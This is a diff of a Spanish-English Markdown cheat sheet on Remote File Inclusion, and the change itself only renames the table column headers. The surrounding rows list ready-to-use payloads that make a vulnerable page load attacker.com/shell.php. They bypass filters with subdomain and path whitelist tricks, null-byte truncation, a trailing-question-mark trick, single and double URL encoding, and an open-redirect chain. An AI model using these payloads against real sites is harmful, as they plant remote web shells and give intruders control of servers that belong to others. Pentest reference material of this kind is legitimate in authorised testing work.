@@ -21,7 +21,7 @@ linked:
 
 ## Whitelist Domain Bypass
 
-| **Bypass** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Subdomain prefix | `?page=http://target.com.attacker.com/shell.php` | Suffix bypass. |
 | Subdomain on attacker domain | `?page=http://attacker.com/target.com/shell.php` | Path traversal en directory. |
@@ -44,7 +44,7 @@ ___
 
 ## Null Byte Truncation
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concept | App appends extension (e.g. `.php`). Null byte truncates string en C-style PHP. | Pre-PHP 5.3.4. |
 | Standard | `?page=http://attacker.com/shell.php%00` | URL-encoded NUL. |
@@ -63,7 +63,7 @@ ___
 
 ## Query String Trick (`?page=...?`)
 
-| **Trick** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concept | App appends `.php` to URL. Atacante's URL ends con `?` → backend's `.php` becomes part of query string, not path | Standard bypass. |
 | Standard | `?page=http://attacker.com/shell.php?` | App: `http://attacker.com/shell.php?.php`. |
@@ -81,7 +81,7 @@ ___
 
 ## URL Encoding
 
-| **Variant** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Standard URL-encode | `?page=http%3A%2F%2Fattacker.com%2Fshell.php` | Bypass keyword filter. |
 | Doble URL-encode | `?page=http%253A%252F%252Fattacker.com%252Fshell.php` | Multi-decode. |
@@ -102,7 +102,7 @@ ___
 
 ## Open Redirect Chain
 
-| **Workflow** | **Step** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concept | Find Open Redirect on target → use as legit-looking URL → redirect a atacante's payload | Whitelist bypass. |
 | Stage 1 | Find Open Redirect on target | See `Open Redirect`. |
